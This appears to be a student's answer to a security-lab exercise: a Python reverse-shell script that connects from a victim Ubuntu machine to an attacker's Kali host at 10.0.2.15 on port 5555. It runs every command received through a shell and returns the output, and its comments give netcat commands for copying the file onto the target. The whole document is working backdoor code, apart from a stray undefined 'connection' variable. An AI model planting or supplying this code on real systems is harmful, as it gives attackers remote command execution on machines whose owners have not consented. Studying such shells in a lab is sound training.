## Question 1
#!usrbinenv python
import socket,subprocess
 
## connecting to ubuntu with port 5555
## ubuntu to recive file from attacker(kali)
# nc -l -p 5555 > cilent.py
 
## kali to send file over
# nc -w 3 10.0.2.5 5555 < cilent.py
 
## connecting to attacker machine(kali)
## https://docs.python.org/3/howto/sockets.html
kali_IP = "10.0.2.15"
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((kali_IP, 5555))
s.send("Connected!\n".encode())

## system takes too long/fail to load
# received_data = s.recv(1024).decode("utf-8").strip()
# print(received_data)
 
## while condition is true, execute interactive commands
## add decode received data here
while True:
    received_data = s.recv(1024)
    if '&' in received_data.decode():
        connection.close()
        break
    else:
        comm = subprocess.Popen(received_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = comm.stdout.read()+ "\n".encode()
        s.send(output)
s.close()
